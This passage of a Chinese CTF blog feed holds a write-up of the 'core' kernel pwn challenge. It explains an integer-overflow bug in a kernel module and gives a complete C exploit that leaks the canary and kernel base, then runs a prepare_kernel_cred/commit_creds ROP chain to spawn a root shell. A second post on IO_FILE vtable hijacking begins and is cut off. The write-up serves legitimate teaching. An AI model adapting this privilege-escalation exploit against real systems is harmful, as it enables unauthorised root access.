Wl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/8aEfLsbPxZlYvhI.png" alt="2.png"></p><ol start="2"><li><p>改变 <code>off</code> 的值，经过观察，这里是改变的 read 函数源地址的偏移。</p></li><li><p>从 <code>name</code> 地址处复制 64字节长度的内存到局部变量 <code>v2</code> 中去。</p></li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/f3SEIpcb5qjBP4K.png" alt="4.png"></p><p>这里我们可以看到，要想 <code>v2</code> 变量溢出，就得使长度大于 63 ，而大于 63 的条件却被 if 判断过滤了。我们观察到 <code>qmemcpy</code> 处 a1 的类型为 <code>int16</code> ，这里就是一个整数溢出，通过传入一个负数长度，我们就可以绕过 if 判断。</p><ol start="4"><li><p>直接向程序输入数据</p><p>这个不需要 <code>ioctl</code> 函数，直接 <code>write</code> 即可，数据会保存到 <code>name</code> 变量</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/ErPB1D4o2dcb9wg.png" alt="3.png"></p></li></ol><h2 id="思路分析">思路分析</h2><p>模块开启了 canary</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/29/QoIt5MHes4ilX7R.png" alt="Snipaste_2020-03-29_12-04-23.png"></p><ol><li>通过 <code>read</code> 泄露程序的 <code>canary</code>、<code>vmlinux_base</code>。</li><li>利用<strong>整数溢出</strong>向程序 <code>write</code> 长度超过 64 的 <code>payload</code>，让程序达到ROP的效果。</li></ol><p>寻找 <code>vmlinux_base</code> 是一个比较艰难的过程，就是在 <code>canary</code> 之后的地址空间中寻找前缀与 <code>vmlinux</code> 相同的地址数据，根据这个来确定 <code>vmlinux_base</code> 。（大概就是通过<strong>真实地址</strong>寻找 <code>libc</code> 基址的过程）。</p><p><strong>补充：</strong> <code>vmlinux_base</code> 和 <code>module_base</code> 拥有不同的基址，如果要使用 .ko 中的 gadget，需要同时泄露 <code>module_base</code> 才行。</p><h2 id="exp">exp</h2><p>因为 <code>kernel pwn</code> 都是使用 c语言编写脚本，所以大多数的内存可以通过 <code>exp</code> 直接访问到，还是比用户态要方便很多。</p><p>与用户态比较不同的是，我们在返回用户态弹shell 之前，必须要恢复现场，相应的，也要在一开始就保存现场，在程序开始时执行以下代码，保存现场。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">           <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">           <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">           <span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">           <span class="string">"pushfq\n"</span></span><br><span class="line">           <span class="string">"popq %2\n"</span></span><br><span class="line">           :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">           :</span><br><span class="line">           : <span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当发生系统调用时，进入内核态之前，首先通过 <code>swapgs</code>指令将 <code>gs </code>寄存器值与某个特定位置切换（显然回来的时候也一样）、然后把用户栈顶<code>esp</code>存到独占变量同时也将独占变量里存的内核栈顶给 <code>esp</code>（显然回来的时候也一样）、最后push各寄存器值（由上一条知是存在内核栈里了），这样保存现场的工作就完成了。</p><p>系统调用执行完了以后就得回用户态，首先 <code>swapgs</code> 恢复 <code>gs</code> ，然后执行 <code>iretq</code> 恢复用户空间，此处需要注意的是： <code>iretq</code> 需要给出用户空间的一些信息 <code>（CS, eflags/rflags, esp/rsp 等） </code>，这些信息在哪的？就是内核栈！想想当时的push啊！</p><ul><li><a href="https://www.anquanke.com/post/id/172216#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172216#h2-7</a></li></ul></blockquote><p>而在 rop 提权完成之后，需要在后面加上如下 payload，以达到恢复现场的目的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   rop[cnt++] = swapgs; <span class="comment">//恢复gs寄存器</span></span><br><span class="line">   rop[cnt++] = <span class="number">0x233</span>;</span><br><span class="line">   rop[cnt++] = iretq; <span class="comment">//IRET(interrupt return)中断返回，中断服务程序的最后一条指令。 </span></span><br><span class="line">   rop[cnt++] = (<span class="keyword">size_t</span>)getshell; <span class="comment">//返回shell的地址</span></span><br><span class="line"><span class="comment">//以下都是还原标志寄存器、段寄存器的信息</span></span><br><span class="line">   rop[cnt++] = user_cs; </span><br><span class="line">   rop[cnt++] = user_eflags;</span><br><span class="line">   rop[cnt++] = user_sp;</span><br><span class="line">   rop[cnt++] = user_ss;</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">           <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">           <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">           <span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">           <span class="string">"pushfq\n"</span></span><br><span class="line">           <span class="string">"popq %2\n"</span></span><br><span class="line">           :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">           :</span><br><span class="line">           : <span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/proc/core"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error while opening core"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> off_set = <span class="number">0x40</span>;</span><br><span class="line">    set_off(fd, off_set);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">size_t</span> vm_module_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">2</span>] - <span class="number">0x19b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> vm_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">4</span>] - <span class="number">0x1dd6d1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] canary: %p\n"</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] vm_base: %p\n"</span>,vm_base);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> commit_creds = vm_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred = vm_base + <span class="number">0x9cce0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi = vm_base + <span class="number">0xb2f</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_rdi_rax_pop_jmp = vm_base + <span class="number">0x532471</span>;</span><br><span class="line">    <span class="comment">// mov rdi, rax ; pop rbp ; jmp rcx</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pop_rcx = vm_base + <span class="number">0x21e53</span>;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx = vm_base + <span class="number">0xa0f49</span>;</span><br><span class="line">    <span class="keyword">size_t</span> ret = vm_base + <span class="number">0x1cc</span>;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs = vm_module_base + <span class="number">0x0d6</span>;</span><br><span class="line">    <span class="keyword">size_t</span> iretq = vm_base + <span class="number">0x50ac2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">8</span>;</span><br><span class="line">    rop[cnt++] = canary;</span><br><span class="line">    rop[cnt++] = <span class="number">0x233</span>;</span><br><span class="line">    rop[cnt++] = pop_rdi;</span><br><span class="line">    rop[cnt++] = <span class="number">0</span>;</span><br><span class="line">    rop[cnt++] = prepare_kernel_cred;</span><br><span class="line">    rop[cnt++] = pop_rcx;</span><br><span class="line">    rop[cnt++] = ret;</span><br><span class="line">    rop[cnt++] = mov_rdi_rax_pop_jmp;</span><br><span class="line">    rop[cnt++] = <span class="number">0x233</span>;</span><br><span class="line">    rop[cnt++] = commit_creds;</span><br><span class="line">    rop[cnt++] = swapgs;</span><br><span class="line">    rop[cnt++] = <span class="number">0x233</span>;</span><br><span class="line">    rop[cnt++] = iretq;</span><br><span class="line">    rop[cnt++] = (<span class="keyword">size_t</span>)getshell;</span><br><span class="line">    rop[cnt++] = user_cs;</span><br><span class="line">    rop[cnt++] = user_eflags;</span><br><span class="line">    rop[cnt++] = user_sp;</span><br><span class="line">    rop[cnt++] = user_ss;</span><br><span class="line">    rop[cnt++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">8</span>*<span class="number">30</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xf000000000000000</span>+ <span class="number">8</span>*<span class="number">30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>内核pwn的主要重点是对提权方法（cred 结构体）的熟悉，因为其运用的大多数知识都是来自于用户态pwn的。并且我们需要对用户和内核态切换过程非常熟练，才能构造出正确的payload。</p><p>参考资料：</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/</a></p><p><a href="https://www.anquanke.com/post/id/172216" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172216</a></p><p><a href="https://bbs.pediy.com/thread-247054.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247054.htm</a> （其中提到了很多坑点，值得一看）</p><p><a href="http://p4nda.top/2018/07/13/ciscn2018-core/" target="_blank" rel="noopener">http://p4nda.top/2018/07/13/ciscn2018-core/</a></p><p><a href="https://blog.csdn.net/weixin_41918450/article/details/82855065" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41918450/article/details/82855065</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
    
      <category term="pwn_canary" scheme="https://mrh1s.top/tags/pwn-canary/"/>
    
      <category term="pwn_kernel" scheme="https://mrh1s.top/tags/pwn-kernel/"/>
    
      <category term="pwn_rop" scheme="https://mrh1s.top/tags/pwn-rop/"/>
    
  </entry>
  
  <entry>
    <title>0x00_CTF_2017_babyheap (vtable伪造并构造rop)</title>
    <link href="https://mrh1s.top/posts/ad8406b9/"/>
    <id>https://mrh1s.top/posts/ad8406b9/</id>
    <published>2020-03-15T04:10:22.000Z</published>
    <updated>2020-03-16T03:26:42.265Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>基础知识</h1><p>IO_FILE 是一种控制流劫持技术，通过修改 <strong>stdout</strong> 结构体，来将控制流跳转到程序的任何位置。</p><p>首先我们来学习一下 IO_FILE 结构体的相关知识：</p><h2 id="IO-FILE-plus">_IO_FILE_plus</h2><p>这个结构体中包含了另外的两个结构体，其中**_IO_FILE** 是文件结构的属性，*<strong>vtable</strong> 是一个虚表，里面存放了一些重要的指针，我们的控制流劫持技术就是通过劫持虚表来控制rip。</p><p>同时，这个表可以通过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file; 